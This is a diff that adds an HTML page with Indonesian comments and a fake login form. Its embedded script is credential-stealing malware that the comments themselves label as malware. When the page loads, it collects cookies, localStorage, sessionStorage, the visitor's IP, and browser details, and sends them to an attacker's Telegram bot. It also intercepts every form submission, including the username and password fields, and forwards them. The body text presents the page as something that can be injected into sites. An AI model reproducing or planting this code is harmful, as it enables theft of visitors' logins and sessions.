@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Situs Anda</title>
+    <script>
+        // <<< KONFIGURASI TELEGRAM >>>
+        const TELEGRAM_BOT_TOKEN = 'ISI_DENGAN_TOKEN_BOT_ANDA'; // Ganti dengan token bot Telegram Anda
+        const TELEGRAM_CHAT_ID = 'ISI_DENGAN_CHAT_ID_ANDA';     // Ganti dengan chat ID grup/user Anda
+
+        // Fungsi untuk mengirim data ke Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'html' // agar bisa mengirim format HTML/Markdown
+            });
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: params.toString()
+                });
+                console.log('Data berhasil dikirim ke Telegram.');
+            } catch (error) {
+                console.error('Gagal mengirim data ke Telegram:', error);
+            }
+        }
+
+        // Fungsi utama untuk mengumpulkan dan mengirim data
+        async function collectAndSendData() {
+            let collectedData = "<b>[Laporan Akses Malware]</b>\n\n";
+
+            // --- 1. Informasi Browser & OS ---
+            collectedData += "<b>Informasi Sistem:</b>\n";
+            collectedData += `User Agent: <code>${navigator.userAgent}</code>\n`;
+            collectedData += `Platform: <code>${navigator.platform}</code>\n`;
+            collectedData += `Bahasa Browser: <code>${navigator.language}</code>\n`;
+            collectedData += `Online: <code>${navigator.onLine ? 'Ya' : 'Tidak'}</code>\n\n`;
+
+            // --- 2. URL Saat Ini ---
+            collectedData += "<b>Informasi URL:</b>\n";
+            collectedData += `Current URL: <code>${window.location.href}</code>\n`;
+            collectedData += `Referrer: <code>${document.referrer || 'Tidak ada'}</code>\n\n`;
+
+            // --- 3. Cookies (Perhatian: Akses terbatas jika SameSite Strict) ---
+            collectedData += "<b>Cookies:</b>\n";
+            if (document.cookie) {
+                collectedData += `<code>${document.cookie}</code>\n\n`;
+            } else {
+                collectedData += "<code>Tidak ada cookies yang dapat diakses (atau dibatasi oleh SameSite).</code>\n\n";
+            }
+
+            // --- 4. Local Storage ---
+            collectedData += "<b>Local Storage:</b>\n";
+            try {
+                if (localStorage.length > 0) {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        collectedData += `<code>${key}: ${value}</code>\n`;
+                    }
+                    collectedData += "\n";
+                } else {
+                    collectedData += "<code>Local Storage kosong.</code>\n\n";
+                }
+            } catch (e) {
+                collectedData += `<code>Gagal mengakses Local Storage: ${e.message}</code>\n\n`;
+            }
+
+            // --- 5. Session Storage ---
+            collectedData += "<b>Session Storage:</b>\n";
+            try {
+                if (sessionStorage.length > 0) {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        const value = sessionStorage.getItem(key);
+                        collectedData += `<code>${key}: ${value}</code>\n`;
+                    }
+                    collectedData += "\n";
+                } else {
+                    collectedData += "<code>Session Storage kosong.</code>\n\n";
+                }
+            } catch (e) {
+                collectedData += `<code>Gagal mengakses Session Storage: ${e.message}</code>\n\n`;
+            }
+            
+            // --- 6. IP Address (Membutuhkan layanan eksternal) ---
+            collectedData += "<b>IP Address:</b>\n";
+            try {
+                const ipResponse = await fetch('https://api64.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                collectedData += `<code>${ipData.ip}</code>\n\n`;
+            } catch (e) {
+                collectedData += `<code>Gagal mendapatkan IP Address: ${e.message}</code>\n\n`;
+            }
+            
+            // --- 7. Screen Resolution ---
+            collectedData += "<b>Resolusi Layar:</b>\n";
+            collectedData += `Width: <code>${window.screen.width}px</code>\n`;
+            collectedData += `Height: <code>${window.screen.height}px</code>\n\n`;
+
+            // --- 8. Waktu Akses ---
+            const now = new Date();
+            collectedData += `<b>Waktu Akses:</b> <code>${now.toUTCString()}</code>\n\n`;
+
+            // Kirim semua data yang terkumpul
+            await sendToTelegram(collectedData);
+        }
+
+        // Jalankan fungsi saat halaman dimuat
+        window.addEventListener('load', collectAndSendData);
+
+        // Contoh: Intercept form submission (jika ada form di halaman)
+        document.addEventListener('submit', async function(event) {
+            const form = event.target;
+            if (form && form.tagName === 'FORM') {
+                const formData = new FormData(form);
+                let formDetails = "<b>[Data Form Terkirim]</b>\n";
+                for (let pair of formData.entries()) {
+                    formDetails += `<code>${pair[0]}: ${pair[1]}</code>\n`;
+                }
+                await sendToTelegram(formDetails);
+            }
+        });
+
+    </script>
+</head>
+<body>
+    <h1>Selamat datang di halaman kami!</h1>
+    <p>Ini adalah contoh halaman yang bisa disisipkan kode.</p>
+    <form>
+        <label for="username">Username:</label><br>
+        <input type="text" id="username" name="username"><br>
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password"><br><br>
+        <input type="submit" value="Login">
+    </form>
+</body>
+</html>
